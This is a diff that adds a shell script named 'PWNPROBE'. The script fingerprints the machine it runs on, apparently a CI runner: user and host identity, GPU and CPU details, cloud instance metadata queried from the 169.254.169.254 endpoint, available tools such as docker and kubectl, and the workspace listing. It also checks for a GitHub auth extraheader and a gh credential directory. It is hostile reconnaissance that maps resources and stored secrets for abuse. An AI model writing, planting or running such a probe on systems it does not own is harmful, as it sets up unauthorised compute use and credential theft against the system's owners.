@@ -1,0 +1,23 @@
+#!/bin/sh
+echo "=== PWNPROBE BEGIN $(date -u) ==="
+id; hostname; uname -a
+head -3 /etc/os-release 2>/dev/null
+echo "--- GPU ---"
+command -v nvidia-smi >/dev/null 2>&1 && { nvidia-smi -L; nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,driver_version --format=csv,noheader; } 2>&1 | head -12
+ls -l /dev/nvidia* 2>&1 | head -8
+head -3 /proc/driver/nvidia/version 2>&1
+lsmod 2>/dev/null | grep -iE 'nvidia|amdgpu' | head -5
+echo "--- CPU/MEM ---"
+nproc 2>/dev/null; free -g 2>/dev/null | head -2
+echo "--- CLOUD METADATA ---"
+curl -s -m 3 http://169.254.169.254/latest/meta-data/instance-type 2>&1; echo
+curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/machine-type 2>&1 | head -2; echo
+echo "--- TOOLS ---"
+for t in nvidia-smi docker python3 gcc git gh kubectl; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null || echo MISSING)"; done
+echo "--- WORKSPACE ---"
+pwd; ls -la | head -12
+echo "--- GIT CREDENTIAL PRESENCE ---"
+git config --get-all http.https://github.com/.extraheader >/dev/null 2>&1 && echo EXTRAHEADER_PRESENT || echo no-extraheader
+ls -la "$HOME/.config/gh" 2>/dev/null | head -4
+echo "=== PWNPROBE END ==="
+exit 1
